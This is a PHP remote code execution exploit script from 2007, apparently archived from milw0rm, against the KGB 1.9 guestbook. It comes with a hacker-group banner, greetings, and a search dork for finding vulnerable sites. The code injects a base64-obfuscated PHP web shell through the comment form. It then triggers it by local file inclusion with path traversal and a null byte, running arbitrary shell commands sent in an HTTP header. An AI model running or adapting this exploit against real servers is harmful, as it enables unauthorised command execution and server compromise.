<?

//Kacper & str0ke Settings 
$exploit_name = "KGB <= 1.9 Remote Code Execution Exploit";
$script_name = "KGB 1.9";
$script_site = "http://www.kgb.xs.com.pl/index.php?tri=2";
$dork = 'inurl:"kgb19"';
//**************************************************************


print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: '.$exploit_name.'
[Script name: '.$script_name.'
[Script site: '.$script_site.'
dork: '.$dork.'

Find by: Kacper (a.k.a Rahim)
Blog: http://kacper.bblog.pl/

DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam
DEVIL TEAM HOME: http://www.rahim.webd.pl/

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)

pepi, D0han, d3m0n, D3m0n (ziom z Niemiec :P)
dn0de, DUREK5, fdj, konsol, mass, michalind, mIvus, nukedclx, QunZ,
RebeL, SkD, Adam, drzewko, Leito, LEON, TomZen, dub1osu, ghost, WRB

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org
and all exploit publishers
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

            Kacper Hacking & Security Blog: http://kacper.bblog.pl/
                 Polish Hacking Portal: http://iHACK.pl
';


/*
Solution:
You only add evil code to comment, and run it: 

kgbmod/sesskglogadmin.php?sesloga=1&skinnn=../../kg/wpisy.txt%00

Very Easy :)

Greetz @ll

Hacking & Security Blog - http://kacper.bblog.pl/

*/


if ($argc<4) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path cmd OPTIONS
host:       target server (ip/hostname)
path:       kgb19 Forum path
cmd:        a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /kgb19/ ls -la -P1.1.1.1:80
php '.$argv[0].' 2.2.2.2 /kgb19/ ls -la
-----------------------------------------------------------------------------
');

die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";

$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "Connected...\n";
$calcifer = base64_decode("Ijs/Pjw/cGhwIG9iX2NsZWFuKCk7Ly9SdWNob215IHphbWVrIEhhdXJ1IDs".
"tKWVjaG8iLi4uSGFja2VyLi5LYWNwZXIuLk1hZGUuLmluLi5Qb2xhbmQhIS".
"4uLkRFVklMLlRFQU0uLnRoZS4uYmVzdC4ucG9saXNoLi50ZWFtLi5HcmVld".
"HouLi4iO2VjaG8iLi4uR28gVG8gREVWSUwgVEVBTSBJUkM6IGlyYy5taWx3".
"MHJtLmNvbTo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSB".
"TSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYX".
"hfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX".
"1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+PD9waHAgZWNobyBLYWNwZXIg".
"SGFjayA6UCINCg0KDQo=");

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="nicek"

Hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="postek"

'.$calcifer.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit"

machnij wpis
-----------------------------7d6224c08dc--
';


echo "wait now insert evil comment...\n";
$packet ="POST ".$p."kg.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);


echo "now remote code execution...\n";
$packet ="GET ".$p."kgbmod/sesskglogadmin.php?sesloga=1&skinnn=../../kg/wpisy.txt%00 HTTP/1.0\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
sleep(1);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}

echo "Exploit err0r :(\n";
echo "Check register_globals = On and magic_quotes_gpc = off\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>

# milw0rm.com [2007-01-15]